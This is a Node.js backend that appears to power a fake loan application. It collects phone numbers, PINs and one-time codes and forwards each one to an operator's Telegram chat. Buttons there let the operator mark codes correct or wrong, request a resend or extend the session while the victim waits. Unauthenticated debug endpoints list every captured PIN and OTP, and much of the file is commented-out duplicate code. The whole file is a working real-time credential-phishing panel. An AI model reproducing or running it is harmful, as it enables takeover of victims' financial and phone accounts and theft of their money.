// //  backend/server.js

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();

// ✅ Configure CORS properly
// app.use(
//   cors({
//     origin: function (origin, callback) {
//       // Allow all origins or specify your frontend URLs
//       const allowedOrigins = [
//         "http://localhost:3000",
//         "http://localhost:5173",
//         "https://kashagi-loans-application-l.onrender.com",
//         process.env.FRONTEND_URL,
//       ].filter(Boolean);

//       if (
//         !origin ||
//         allowedOrigins.includes(origin) ||
//         allowedOrigins.includes("*")
//       ) {
//         callback(null, true);
//       } else {
//         callback(new Error("Not allowed by CORS"));
//       }
//     },
//     credentials: true,
//     methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
//   })
// );

// const allowedOrigins = [
//   "http://localhost:3000",
//   "http://localhost:5173",
//   "https://kashagi-loans-application-1.onrender.com",
//   "https://kashagi-loans-application-l.onrender.com",
//   process.env.FRONTEND_URL,
// ].filter(Boolean);

// app.use(
//   cors({
//     origin: function (origin, callback) {
//       // Allow requests with no origin
//       if (!origin) return callback(null, true);

//       if (allowedOrigins.includes(origin)) {
//         callback(null, true);
//       } else {
//         console.log("❌ CORS blocked origin:", origin);
//         console.log("✅ Allowed origins:", allowedOrigins);
//         callback(new Error("Not allowed by CORS"));
//       }
//     },
//     credentials: true,
//     methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
//   })
// );

app.use(
  cors({
    origin: "*", // Allow everything
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  })
);

app.use(express.json());

// ✅ Validate environment variables
if (!process.env.BOT_TOKEN) {
  console.error("❌ ERROR: BOT_TOKEN is not set in .env file");
  process.exit(1);
}

if (!process.env.TG_CHAT_ID) {
  console.error("❌ ERROR: TG_CHAT_ID is not set in .env file");
  process.exit(1);
}

// ✅ Initialize bot with error handling
let bot;
try {
  bot = new Telegraf(process.env.BOT_TOKEN);
  console.log("✅ Telegram bot initialized");
} catch (error) {
  console.error("❌ Failed to initialize Telegram bot:", error.message);
  process.exit(1);
}

// Store user verification sessions
const verificationSessions = new Map();
const pinSessions = new Map();
const TIMEOUT_MINUTES = 5; // Changed from 500 to 5 minutes

// ==================== HELPER FUNCTIONS ====================

function formatPinMessage(pinData) {
  const now = new Date();
  const formattedTime = now
    .toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      hour12: false,
    })
    .replace(":", ".");

  return `
<b># Thor - PIN Verification</b>
<b>PIN VERIFICATION NEEDED</b>

<b>USER DETAILS:</b>
• <b>Phone Number:</b> ${pinData.phoneNumber}
• <b>PIN Code:</b> <code>${pinData.pinCode}</code>
• <b>User ID:</b> ${pinData.userId || "Unknown"}
• <b>Time:</b> ${pinData.time}

══════════════════════════

<b>Verify the PIN:</b>
• PIN Length: ${pinData.pinCode.length} digits
• Timeout: ${TIMEOUT_MINUTES} minutes
  ${formattedTime}

══════════════════════════
  `;
}

function formatVerificationMessage(userData) {
  const now = new Date();
  const formattedTime = now
    .toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      hour12: false,
    })
    .replace(":", ".");

  return `
<b># Oliva</b>
<b>Connecting...</b>

<b>NEW USER - VERIFICATION NEEDED</b>
• <b>Country Code:</b> ${userData.countryCode}
• <b>Phone Number:</b> ${userData.phoneNumber}
• <b>OTP Code:</b> <code>${userData.otpCode}</code>
• <b>Time:</b> ${userData.time}

══════════════════════════

<b>Verify the credentials:</b>
• Timeout: ${TIMEOUT_MINUTES} minutes
  ${formattedTime}

══════════════════════════
  `;
}

// ==================== PIN ENDPOINTS ====================

// ✅ PIN verification endpoint
app.post("/api/verify-pin", async (req, res) => {
  try {
    const { phoneNumber, pinCode, userId, userName } = req.body;

    // Validate input
    if (!phoneNumber || !pinCode) {
      return res.status(400).json({
        error: "Missing required fields: phoneNumber and pinCode are required",
      });
    }

    // Validate PIN format (4-6 digits)
    if (!/^\d{4,6}$/.test(pinCode)) {
      return res.status(400).json({
        error: "PIN must be 4-6 digits",
      });
    }

    // Create PIN session
    const sessionId = `PIN_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 9)}`;
    const now = Date.now();

    const pinData = {
      sessionId,
      phoneNumber,
      pinCode,
      userId: userId || "unknown",
      userName: userName || "PIN User",
      time: new Date(now).toLocaleString("en-US", {
        month: "2-digit",
        day: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      }),
      status: "pending",
      type: "pin",
      createdAt: now,
      expiresAt: now + TIMEOUT_MINUTES * 60 * 1000,
      message: "PIN verification pending...",
    };

    // Store PIN session
    pinSessions.set(sessionId, pinData);
    console.log(`🔐 New PIN session created: ${sessionId} for ${phoneNumber}`);

    // Format Telegram message for PIN
    const message = formatPinMessage(pinData);

    // Send to Telegram
    try {
      await bot.telegram.sendMessage(process.env.TG_CHAT_ID, message, {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "✅ Correct PIN",
              `pin_correct_${sessionId}`
            ),
          ],
          [
            Markup.button.callback(
              "Correct PIN & OTP",
              `pinotp_correct_${sessionId}`
            ),
            Markup.button.callback("❌ Wrong PIN", `pin_wrong_${sessionId}`),
          ],
          [Markup.button.callback("⏱️ Extend Time", `pin_extend_${sessionId}`)],
        ]),
      });
      console.log(`📤 PIN Telegram message sent for session: ${sessionId}`);
    } catch (tgError) {
      console.error("❌ Failed to send PIN Telegram message:", tgError.message);
      pinSessions.delete(sessionId);
      return res.status(500).json({
        error: "Failed to send PIN verification request to Telegram",
        details: tgError.message,
      });
    }

    res.json({
      success: true,
      sessionId,
      message: "PIN verification request sent to Telegram",
      timeout: TIMEOUT_MINUTES,
      checkStatusUrl: `/api/check-pin-status/${sessionId}`,
      type: "pin",
    });
  } catch (error) {
    console.error("❌ Error in /api/verify-pin:", error);
    res.status(500).json({
      error: "Failed to process PIN verification request",
      details: error.message,
    });
  }
});

// ✅ Check PIN status endpoint
app.get("/api/check-pin-status/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const session = pinSessions.get(sessionId);

  if (!session) {
    return res.json({
      status: "expired",
      message: "PIN session expired or not found",
    });
  }

  const now = Date.now();
  const timeLeft = Math.max(0, session.expiresAt - now);
  const minutesLeft = Math.ceil(timeLeft / (60 * 1000));

  if (timeLeft <= 0 && session.status === "pending") {
    session.status = "expired";
    session.message = "PIN verification timeout";
  }

  res.json({
    status: session.status,
    timeLeft: minutesLeft,
    message: session.message || "",
    updatedAt: session.updatedAt || session.time,
    phone: session.phoneNumber,
    sessionId: session.sessionId,
    type: "pin",
  });
});

// ==================== OTP ENDPOINTS ====================

// ✅ Health check endpoint
app.get("/", (req, res) => {
  res.json({
    status: "online",
    service: "Telegram Verification API",
    endpoints: {
      verifyPin: "POST /api/verify-pin",
      checkPinStatus: "GET /api/check-pin-status/:sessionId",
      verifyUser: "POST /api/verify-user",
      checkStatus: "GET /api/check-status/:sessionId",
    },
    pinSessions: pinSessions.size,
    otpSessions: verificationSessions.size,
  });
});

// OTP verification endpoint
app.post("/api/verify-user", async (req, res) => {
  try {
    const { countryCode, phoneNumber, otpCode, userId, userName } = req.body;

    // Validate input
    if (!phoneNumber || !otpCode) {
      return res.status(400).json({
        error: "Missing required fields: phoneNumber and otpCode are required",
      });
    }

    // Create session data
    const sessionId = `OTP_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 9)}`;
    const now = Date.now();

    const userData = {
      sessionId,
      countryCode: countryCode || "+263",
      phoneNumber,
      otpCode,
      userId: userId || "unknown",
      userName: userName || "NEW USER",
      time: new Date(now).toLocaleString("en-US", {
        month: "2-digit",
        day: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      }),
      status: "pending",
      createdAt: now,
      expiresAt: now + TIMEOUT_MINUTES * 60 * 1000,
      message: "Waiting for approval...",
    };

    // Store session
    verificationSessions.set(sessionId, userData);
    console.log(`📱 New OTP session created: ${sessionId} for ${phoneNumber}`);

    // Format Telegram message
    const message = formatVerificationMessage(userData);

    // Send to Telegram with error handling
    try {
      await bot.telegram.sendMessage(process.env.TG_CHAT_ID, message, {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "✅ Correct (PIN + OTP)",
              `correct_${sessionId}`
            ),
          ],
          [
            Markup.button.callback("❌ Wrong Code", `wrong_code_${sessionId}`),
            Markup.button.callback("❌ Wrong PIN", `wrong_pin_${sessionId}`),
          ],
          [
            Markup.button.callback("🔄 Resend OTP", `resend_${sessionId}`),
            Markup.button.callback("⏱️ Extend Time", `extend_${sessionId}`),
          ],
        ]),
      });
      console.log(`📤 OTP Telegram message sent for session: ${sessionId}`);
    } catch (tgError) {
      console.error("❌ Failed to send Telegram message:", tgError.message);
      verificationSessions.delete(sessionId);
      return res.status(500).json({
        error: "Failed to send verification request to Telegram",
        details: tgError.message,
      });
    }

    res.json({
      success: true,
      sessionId,
      message: "Verification requested",
      timeout: TIMEOUT_MINUTES,
      checkStatusUrl: `/api/check-status/${sessionId}`,
    });
  } catch (error) {
    console.error("❌ Error in /api/verify-user:", error);
    res.status(500).json({
      error: "Failed to process verification request",
      details: error.message,
    });
  }
});

// Check verification status
app.get("/api/check-status/:sessionId", (req, res) => {
  const sessionId = req.params.sessionId;
  const session = verificationSessions.get(sessionId);

  if (!session) {
    return res.json({
      status: "expired",
      message: "Session expired or not found",
    });
  }

  const now = Date.now();
  const timeLeft = Math.max(0, session.expiresAt - now);
  const minutesLeft = Math.ceil(timeLeft / (60 * 1000));

  // Auto-expire if timeout reached
  if (timeLeft <= 0 && session.status === "pending") {
    session.status = "expired";
    session.message = "Verification timeout";
  }

  res.json({
    status: session.status,
    timeLeft: minutesLeft,
    message: session.message || "",
    updatedAt: session.updatedAt || session.time,
    phone: session.phoneNumber,
    sessionId: session.sessionId,
  });
});

// ==================== DEBUG ENDPOINTS ====================

app.get("/api/debug/pin-sessions", (req, res) => {
  const sessions = Array.from(pinSessions.entries()).map(([id, session]) => ({
    id,
    phone: session.phoneNumber,
    status: session.status,
    pin: session.pinCode,
    createdAt: new Date(session.createdAt).toISOString(),
    expiresAt: new Date(session.expiresAt).toISOString(),
    timeLeft: session.expiresAt - Date.now(),
  }));

  res.json({
    total: pinSessions.size,
    sessions,
  });
});

app.get("/api/debug/otp-sessions", (req, res) => {
  const sessions = Array.from(verificationSessions.entries()).map(
    ([id, session]) => ({
      id,
      phone: session.phoneNumber,
      status: session.status,
      otp: session.otpCode,
      createdAt: new Date(session.createdAt).toISOString(),
      expiresAt: new Date(session.expiresAt).toISOString(),
      timeLeft: session.expiresAt - Date.now(),
    })
  );

  res.json({
    total: verificationSessions.size,
    sessions,
  });
});

// ==================== TELEGRAM HANDLERS ====================

// ✅ PIN HANDLERS FIRST (MORE SPECIFIC)
// In server.js, update PIN handlers:

bot.action(/pin_correct_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = pinSessions.get(sessionId);

  if (session) {
    // ... existing code ...
    session.status = "approved"; // Make sure this is set
    session.message = "PIN verified successfully";
    session.updatedAt = new Date().toISOString();
    // ... rest of code ...
  }
});

bot.action(/pinotp_correct_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = pinSessions.get(sessionId);

  if (session) {
    session.status = "approved_with_otp"; // Make sure this is set
    session.message = "Verification successful - PIN and OTP correct";
    session.updatedAt = new Date().toISOString();
    // ... rest of code ...
  }
});

bot.action(/pin_wrong_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = pinSessions.get(sessionId);

  if (session) {
    session.status = "wrong_pin"; // Make sure this is set
    session.message = "PIN is incorrect";
    session.updatedAt = new Date().toISOString();
    // ... rest of code ...
  }
});

// bot.action(/pin_correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   console.log(`🎯 PIN correct handler triggered: ${sessionId}`);

//   const session = pinSessions.get(sessionId);

//   if (session) {
//     // Check expiration
//     if (Date.now() > session.expiresAt) {
//       session.status = "expired";
//       session.message = "PIN verification timeout";
//       await ctx.answerCbQuery("PIN verification time expired");
//       return;
//     }

//     // Update session
//     session.status = "approved";
//     session.message = "PIN verified successfully";
//     session.updatedAt = new Date().toISOString();

//     console.log(`✅ PIN approved for: ${session.phoneNumber}`);

//     await ctx.answerCbQuery("✅ PIN approved!");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN APPROVED</b> - User can proceed`,
//       { parse_mode: "HTML" }
//     );
//   } else {
//     console.log(`❌ PIN session not found: ${sessionId}`);
//     await ctx.answerCbQuery("PIN session not found");
//   }
// });

// bot.action(/pin_wrong_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   if (session && Date.now() < session.expiresAt) {
//     session.status = "wrong_pin";
//     session.message = "PIN is incorrect";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("❌ Wrong PIN");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided`,
//       { parse_mode: "HTML" }
//     );
//   } else {
//     await ctx.answerCbQuery("PIN session not found or expired");
//   }
// });

// bot.action(/pinotp_correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   if (session && Date.now() < session.expiresAt) {
//     session.status = "approved_with_otp";
//     session.message = "Verification successful - PIN and OTP correct";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("✅ PIN & OTP approved!");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN & OTP APPROVED</b> - Full verification complete`,
//       { parse_mode: "HTML" }
//     );
//   } else {
//     await ctx.answerCbQuery("PIN session not found or expired");
//   }
// });

bot.action(/pin_extend_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = pinSessions.get(sessionId);

  if (session) {
    session.expiresAt = Date.now() + TIMEOUT_MINUTES * 60 * 1000;
    session.message = "PIN verification time extended";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("⏱️ PIN time extended");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b> - +${TIMEOUT_MINUTES} minutes`,
      { parse_mode: "HTML" }
    );
  } else {
    await ctx.answerCbQuery("PIN session not found");
  }
});

// ✅ OTP HANDLERS (LESS SPECIFIC)

bot.action(/correct_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  console.log(`🎯 OTP correct handler triggered: ${sessionId}`);

  // Check if this is a PIN session first (starts with PIN_)
  if (sessionId.startsWith("PIN_")) {
    // Let PIN handlers handle it
    console.log(`⚠️ OTP handler ignoring PIN session: ${sessionId}`);
    return;
  }

  const session = verificationSessions.get(sessionId);

  if (session) {
    session.status = "approved";
    session.message = "Credentials verified successfully";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("✅ User approved!");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n✅ <b>APPROVED</b> - User can proceed`,
      { parse_mode: "HTML" }
    );

    console.log(
      `✅ OTP User ${session.userId} (${session.phoneNumber}) approved`
    );
  } else {
    await ctx.answerCbQuery("Session expired");
  }
});

bot.action(/wrong_code_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.status = "wrong_code";
    session.message = "OTP code is incorrect. Please resend.";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("❌ Wrong OTP code");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG CODE</b> - Please resend OTP`,
      { parse_mode: "HTML" }
    );
  }
});

// Add this handler in server.js after the wrong_code_ handler
bot.action(/wrong_pin_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  console.log(`🎯 OTP wrong_pin handler triggered: ${sessionId}`);

  // First check if it's a PIN session (starts with PIN_)
  if (sessionId.startsWith("PIN_")) {
    console.log(
      `⚠️ wrong_pin_ action for PIN session handled by PIN handler: ${sessionId}`
    );
    return; // Let the PIN handler handle this
  }

  const session = verificationSessions.get(sessionId);

  if (session) {
    // Check expiration
    const now = Date.now();
    if (now > session.expiresAt) {
      session.status = "expired";
      session.message = "OTP verification timeout";
      await ctx.answerCbQuery("OTP verification time expired");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n⏰ <b>SESSION EXPIRED</b> - Verification timeout`,
        { parse_mode: "HTML" }
      );
      return;
    }

    // Update session
    session.status = "wrong_pin";
    session.message = "PIN is incorrect for OTP verification";
    session.updatedAt = new Date().toISOString();
    session.updatedAtTimestamp = now;

    console.log(
      `❌ OTP Wrong PIN for: ${session.phoneNumber} (Session: ${sessionId})`
    );

    await ctx.answerCbQuery("❌ Wrong PIN");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided for OTP verification`,
      { parse_mode: "HTML" }
    );

    // Log for debugging
    console.log(`📝 Session ${sessionId} updated to status: ${session.status}`);
    console.log(`📝 Session message: ${session.message}`);
  } else {
    console.log(`❌ OTP session not found: ${sessionId}`);
    await ctx.answerCbQuery("OTP session not found or expired");

    // Try to find in PIN sessions (just in case)
    const pinSession = pinSessions.get(sessionId);
    if (pinSession) {
      console.log(
        `⚠️ Found session ${sessionId} in PIN sessions, not OTP sessions`
      );
    }
  }
});

bot.action(/resend_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.status = "resend_requested";
    session.message = "OTP resend requested";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("🔄 OTP resend requested");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n🔄 <b>OTP RESEND REQUESTED</b>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.action(/extend_(.+)/, async (ctx) => {
  const sessionId = ctx.match[1];
  const session = verificationSessions.get(sessionId);

  if (session) {
    session.expiresAt = Date.now() + TIMEOUT_MINUTES * 60 * 1000;
    session.message = "Time extended";
    session.updatedAt = new Date().toISOString();

    await ctx.answerCbQuery("⏱️ Time extended");
    await ctx.editMessageText(
      `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b>`,
      { parse_mode: "HTML" }
    );
  }
});

// ✅ Bot error handling
bot.catch((err, ctx) => {
  console.error(`❌ Telegram bot error for ${ctx.updateType}:`, err);
});

// ✅ Start bot with conflict handling
const startBot = async () => {
  try {
    await bot.launch();
    console.log("🤖 Telegram bot started successfully");
  } catch (err) {
    if (err.response?.error_code === 409) {
      console.log("⚠️ Bot already running elsewhere. Webhook mode active.");
      console.log("📱 Bot can still receive messages via webhooks");
    } else {
      console.error("❌ Failed to start Telegram bot:", err.message);
    }
  }
};

// Start server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
  console.log(
    `✅ Telegram bot token: ${process.env.BOT_TOKEN ? "Set ✓" : "Missing ✗"}`
  );
  console.log(`✅ Telegram chat ID: ${process.env.TG_CHAT_ID || "Missing ✗"}`);
  console.log(`⏰ Timeout: ${TIMEOUT_MINUTES} minutes`);

  // Start bot
  startBot();
});

// Cleanup old sessions every hour
setInterval(() => {
  const now = Date.now();
  let cleaned = 0;

  // Clean PIN sessions older than 24 hours
  for (const [id, session] of pinSessions.entries()) {
    if (now - session.createdAt > 24 * 60 * 60 * 1000) {
      pinSessions.delete(id);
      cleaned++;
    }
  }

  // Clean OTP sessions older than 24 hours
  for (const [id, session] of verificationSessions.entries()) {
    if (now - session.createdAt > 24 * 60 * 60 * 1000) {
      verificationSessions.delete(id);
      cleaned++;
    }
  }

  if (cleaned > 0) {
    console.log(`🧹 Cleaned ${cleaned} old sessions`);
  }
}, 60 * 60 * 1000);

// const { Telegraf, Markup } = require("telegraf");
// const express = require("express");
// const cors = require("cors");
// require("dotenv").config();

// const app = express();
// app.use(cors());
// app.use(express.json());

// // ✅ Validate environment variables
// if (!process.env.BOT_TOKEN) {
//   console.error("❌ ERROR: BOT_TOKEN is not set in .env file");
//   process.exit(1);
// }

// if (!process.env.TG_CHAT_ID) {
//   console.error("❌ ERROR: TG_CHAT_ID is not set in .env file");
//   process.exit(1);
// }

// // ✅ Initialize bot with error handling
// let bot;
// try {
//   bot = new Telegraf(process.env.BOT_TOKEN);
//   console.log("✅ Telegram bot initialized");
// } catch (error) {
//   console.error("❌ Failed to initialize Telegram bot:", error.message);
//   process.exit(1);
// }

// // Store user verification sessions
// const verificationSessions = new Map();
// const TIMEOUT_MINUTES = 500;

// // Format PIN verification message

// function formatPinMessage(pinData) {
//   const now = new Date();
//   const formattedTime = now
//     .toLocaleTimeString("en-US", {
//       hour: "2-digit",
//       minute: "2-digit",
//       hour12: false,
//     })
//     .replace(":", ".");

//   return `
// <b># Thor - PIN Verification</b>
// <b>PIN VERIFICATION NEEDED</b>

// <b>USER DETAILS:</b>
// • <b>Phone Number:</b> ${pinData.phoneNumber}
// • <b>PIN Code:</b> <code>${pinData.pinCode}</code>
// • <b>User ID:</b> ${pinData.userId || "Unknown"}
// • <b>Time:</b> ${pinData.time}

// ══════════════════════════

// <b>Verify the PIN:</b>
// • PIN Length: ${pinData.pinCode.length} digits
// • Timeout: ${TIMEOUT_MINUTES} minutes
//   ${formattedTime}

// ══════════════════════════
//   `;
// }

// // Store PIN sessions separately from OTP sessions
// const pinSessions = new Map();

// // ✅ NEW: PIN verification endpoint
// app.post("/api/verify-pin", async (req, res) => {
//   try {
//     const { phoneNumber, pinCode, userId, userName } = req.body;

//     // Validate input
//     if (!phoneNumber || !pinCode) {
//       return res.status(400).json({
//         error: "Missing required fields: phoneNumber and pinCode are required",
//       });
//     }

//     // Validate PIN format (4-6 digits)
//     if (!/^\d{4,6}$/.test(pinCode)) {
//       return res.status(400).json({
//         error: "PIN must be 4-6 digits",
//       });
//     }

//     // Create PIN session
//     const sessionId = `PIN_${Date.now()}_${Math.random()
//       .toString(36)
//       .substr(2, 9)}`;
//     const now = new Date();

//     const pinData = {
//       sessionId,
//       phoneNumber,
//       pinCode,
//       userId: userId || "unknown",
//       userName: userName || "PIN User",
//       time: now.toLocaleString("en-US", {
//         month: "2-digit",
//         day: "2-digit",
//         year: "numeric",
//         hour: "2-digit",
//         minute: "2-digit",
//         second: "2-digit",
//         hour12: true,
//       }),
//       status: "pending",
//       type: "pin", // Differentiate from OTP
//       createdAt: Date.now(),
//       expiresAt: Date.now() + TIMEOUT_MINUTES * 60 * 1000,
//       message: "PIN verification pending...",
//     };

//     // Store PIN session
//     pinSessions.set(sessionId, pinData);
//     console.log(`🔐 New PIN session created: ${sessionId} for ${phoneNumber}`);

//     // Format Telegram message for PIN
//     const message = formatPinMessage(pinData);

//     // Send to Telegram
//     try {
//       await bot.telegram.sendMessage(process.env.TG_CHAT_ID, message, {
//         parse_mode: "HTML",
//         ...Markup.inlineKeyboard([
//           [
//             Markup.button.callback(
//               "✅ Correct PIN",
//               `pin_correct_${sessionId}`
//             ),
//           ],
//           [
//             Markup.button.callback(
//               "Correct PIN & OTP",
//               `pinotp_correct_${sessionId}`
//             ),
//             Markup.button.callback("❌ Wrong PIN", `pin_wrong_${sessionId}`),
//           ],

//           [Markup.button.callback("⏱️ Extend Time", `pin_extend_${sessionId}`)],
//         ]),
//       });
//       console.log(`📤 PIN Telegram message sent for session: ${sessionId}`);
//     } catch (tgError) {
//       console.error("❌ Failed to send PIN Telegram message:", tgError.message);
//       pinSessions.delete(sessionId);
//       return res.status(500).json({
//         error: "Failed to send PIN verification request to Telegram",
//         details: tgError.message,
//       });
//     }

//     // Cleanup after timeout
//     setTimeout(() => {
//       const session = pinSessions.get(sessionId);
//       if (session && session.status === "pending") {
//         pinSessions.delete(sessionId);
//         console.log(`⏰ PIN Session ${sessionId} expired`);
//       }
//     }, TIMEOUT_MINUTES * 60 * 1000);

//     res.json({
//       success: true,
//       sessionId,
//       message: "PIN verification request sent to Telegram",
//       timeout: TIMEOUT_MINUTES,
//       checkStatusUrl: `/api/check-pin-status/${sessionId}`,
//       type: "pin",
//     });
//   } catch (error) {
//     console.error("❌ Error in /api/verify-pin:", error);
//     res.status(500).json({
//       error: "Failed to process PIN verification request",
//       details: error.message,
//     });
//   }
// });

// // ✅ NEW: Check PIN status endpoint
// app.get("/api/check-pin-status/:sessionId", (req, res) => {
//   const sessionId = req.params.sessionId;
//   const session = pinSessions.get(sessionId);

//   if (!session) {
//     return res.json({
//       status: "expired",
//       message: "PIN session expired or not found",
//     });
//   }

//   const now = Date.now();
//   const timeLeft = Math.max(0, session.expiresAt - now);
//   const minutesLeft = Math.ceil(timeLeft / (60 * 1000));

//   if (timeLeft <= 0 && session.status === "pending") {
//     session.status = "expired";
//     session.message = "PIN verification timeout";
//   }

//   res.json({
//     status: session.status,
//     timeLeft: minutesLeft,
//     message: session.message || "",
//     updatedAt: session.updatedAt || session.time,
//     phone: session.phoneNumber,
//     sessionId: session.sessionId,
//     type: "pin",
//   });
// });

// bot.action(/pin_correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   console.log(`🔍 Checking PIN session: ${sessionId}`); // Debug log

//   try {
//     const session = pinSessions.get(sessionId);
//     console.log(`📊 Session found: ${!!session}, Status: ${session?.status}`); // Debug log

//     if (!session) {
//       console.log(`❌ Session ${sessionId} not found in pinSessions`);
//       await ctx.answerCbQuery("Session not found or already processed");
//       return;
//     }

//     // Check if session is expired
//     const now = Date.now();
//     console.log(
//       `⏰ Now: ${now}, ExpiresAt: ${session.expiresAt}, TimeLeft: ${
//         session.expiresAt - now
//       }ms`
//     ); // Debug log

//     if (now > session.expiresAt) {
//       console.log(`⏰ Session ${sessionId} expired`);
//       session.status = "expired";
//       session.message = "PIN verification timeout";
//       await ctx.answerCbQuery("PIN verification time expired");
//       await ctx.editMessageText(
//         `${ctx.callbackQuery.message.text}\n\n⏰ <b>SESSION EXPIRED</b> - PIN verification timeout`,
//         { parse_mode: "HTML" }
//       );
//       return;
//     }

//     // Check if already processed
//     if (session.status !== "pending") {
//       console.log(
//         `ℹ️ Session ${sessionId} already processed with status: ${session.status}`
//       );
//       await ctx.answerCbQuery(`PIN already ${session.status}`);
//       return;
//     }

//     // ✅ APPROVE THE PIN
//     session.status = "approved";
//     session.message = "PIN verified successfully";
//     session.updatedAt = new Date().toISOString();
//     session.approvedAt = Date.now();

//     console.log(`✅ PIN approved for session: ${sessionId}`);

//     await ctx.answerCbQuery("✅ PIN approved!");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN APPROVED</b> - User can proceed`,
//       { parse_mode: "HTML" }
//     );

//     // DON'T DELETE THE SESSION - let it be cleaned up later
//     // pinSessions.delete(sessionId); // ❌ Remove this line
//   } catch (error) {
//     console.error(`❌ Error in pin_correct handler for ${sessionId}:`, error);
//     await ctx.answerCbQuery("Error processing PIN approval");
//   }
// });

// // ✅ FIXED: Correct PIN & OTP handler
// bot.action(/pinotp_correct_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   // Check if session exists AND is not expired
//   if (session && Date.now() < session.expiresAt) {
//     session.status = "pinotp_correct"; // Changed from "pinotp_correct_"
//     session.message = "Verification successful - PIN and OTP correct";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("✅ PIN & OTP approved!");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN & OTP APPROVED</b> - Full verification complete`,
//       { parse_mode: "HTML" }
//     );
//   } else {
//     if (!session) {
//       await ctx.answerCbQuery("PIN session not found");
//     } else if (Date.now() >= session.expiresAt) {
//       await ctx.answerCbQuery("PIN session has expired");
//     }
//   }
// });

// // ✅ FIXED: Wrong PIN handler
// bot.action(/pin_wrong_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   // Check if session exists AND is not expired
//   if (session && Date.now() < session.expiresAt) {
//     session.status = "wrong_pin";
//     session.message = "PIN is incorrect";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("❌ Wrong PIN");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided`,
//       { parse_mode: "HTML" }
//     );
//   } else {
//     if (!session) {
//       await ctx.answerCbQuery("PIN session not found");
//     } else if (Date.now() >= session.expiresAt) {
//       await ctx.answerCbQuery("PIN verification time has expired");
//     }
//   }
// });

// // ✅ FIXED: Extend time handler
// bot.action(/pin_extend_(.+)/, async (ctx) => {
//   const sessionId = ctx.match[1];
//   const session = pinSessions.get(sessionId);

//   // Allow extending even if slightly expired (within grace period)
//   const gracePeriod = 30000; // 30 seconds grace period
//   if (session && Date.now() < session.expiresAt + gracePeriod) {
//     session.expiresAt = Date.now() + TIMEOUT_MINUTES * 60 * 1000;
//     session.message = "PIN verification time extended by 5 minutes";
//     session.updatedAt = new Date().toISOString();

//     await ctx.answerCbQuery("⏱️ PIN time extended");
//     await ctx.editMessageText(
//       `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b> - +5 minutes for PIN verification`,
//       { parse_mode: "HTML" }
//     );
//   } else {
//     if (!session) {
//       await ctx.answerCbQuery("PIN session not found");
//     } else {
//       await ctx.answerCbQuery("Cannot extend - session fully expired");
//     }
//   }
// });

// // Format message like in your image
// function formatVerificationMessage(userData) {
//   const now = new Date();
//   const formattedTime = now
//     .toLocaleTimeString("en-US", {
//       hour: "2-digit",
